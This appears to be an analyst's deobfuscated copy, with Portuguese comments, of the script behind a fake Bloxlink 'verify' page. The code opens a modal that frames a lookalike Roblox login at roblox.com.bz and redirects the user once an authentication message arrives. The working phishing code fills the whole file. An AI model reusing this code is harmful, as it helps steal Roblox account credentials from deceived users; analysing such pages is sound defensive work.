/**
 * ==============================================================================
 * DEOBFUSCATED CODE - bloxlink.win (/verify?server=4191421542448922)
 * ==============================================================================
 * 
 * Este é o código limpo, legível e desobfuscado do script de 156KB
 * que roda na página de verificação do bloxlink.win.
 */

document.addEventListener('DOMContentLoaded', () => {
  // 1. Elementos do DOM capturados pelo script
  const usernameInput = document.getElementById('username');
  const verifyBtn = document.getElementById('verify');
  const modal = document.getElementById('verificationModal');
  const modalContent = document.getElementById('modalContent');
  const closeModalBtn = document.getElementById('closeModal');
  const verificationFrame = document.getElementById('verificationFrame');

  // 2. Extração do parâmetro 'server' da URL
  const urlParams = new URLSearchParams(window.location.search);
  const serverId = urlParams.get('server') || '4191421542448922';

  // 3. Configuração do endpoint alvo (Roblox OAuth / Login)
  const TARGET_BASE_URL = 'https://roblox.com.bz/login';
  const targetVerificationUrl = `${TARGET_BASE_URL}?returnUrl=${encodeURIComponent(serverId)}`;

  /**
   * Abre o modal de verificação e carrega o iframe alvo
   */
  function openVerificationModal(username) {
    if (!verificationFrame || !modal) return;

    // Desativa o botão para evitar múltiplos cliques
    if (verifyBtn) {
      verifyBtn.disabled = true;
      verifyBtn.classList.add('opacity-60', 'cursor-not-allowed');
    }
    if (usernameInput) {
      usernameInput.disabled = true;
      usernameInput.classList.add('opacity-60', 'cursor-not-allowed');
    }

    // Define o src do iframe com a URL de destino
    verificationFrame.src = targetVerificationUrl;

    // Exibe o modal com animação suave de transição
    modal.classList.remove('hidden');
    modal.classList.add('flex');

    setTimeout(() => {
      if (modalContent) {
        modalContent.classList.remove('scale-95', 'opacity-0');
        modalContent.classList.add('scale-100', 'opacity-100');
      }
    }, 20);
  }

  /**
   * Fecha o modal e redefine o iframe
   */
  function closeVerificationModal() {
    if (!modal) return;

    if (modalContent) {
      modalContent.classList.remove('scale-100', 'opacity-100');
      modalContent.classList.add('scale-95', 'opacity-0');
    }

    setTimeout(() => {
      modal.classList.add('hidden');
      modal.classList.remove('flex');
      if (verificationFrame) {
        verificationFrame.src = 'about:blank';
      }

      // Reativa os campos
      if (verifyBtn) {
        verifyBtn.disabled = false;
        verifyBtn.classList.remove('opacity-60', 'cursor-not-allowed');
      }
      if (usernameInput) {
        usernameInput.disabled = false;
        usernameInput.classList.remove('opacity-60', 'cursor-not-allowed');
      }
    }, 250);
  }

  // 4. Listeners de clique e teclado
  if (verifyBtn) {
    verifyBtn.addEventListener('click', (e) => {
      e.preventDefault();
      const username = usernameInput ? usernameInput.value.trim() : '';
      openVerificationModal(username);
    });
  }

  if (usernameInput) {
    usernameInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        const username = usernameInput.value.trim();
        openVerificationModal(username);
      }
    });
  }

  if (closeModalBtn) {
    closeModalBtn.addEventListener('click', (e) => {
      e.preventDefault();
      closeVerificationModal();
    });
  }

  // Fechar ao clicar no backdrop (fora da caixa do modal)
  if (modal) {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        closeVerificationModal();
      }
    });
  }

  // Fechar com a tecla Escape
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && modal && !modal.classList.contains('hidden')) {
      closeVerificationModal();
    }
  });

  // Listener para mensagens pós-login vindas do iframe
  window.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'ROBLOX_AUTH_SUCCESS') {
      window.location.href = 'https://bloxlink.win/dashboard';
    }
  });
});
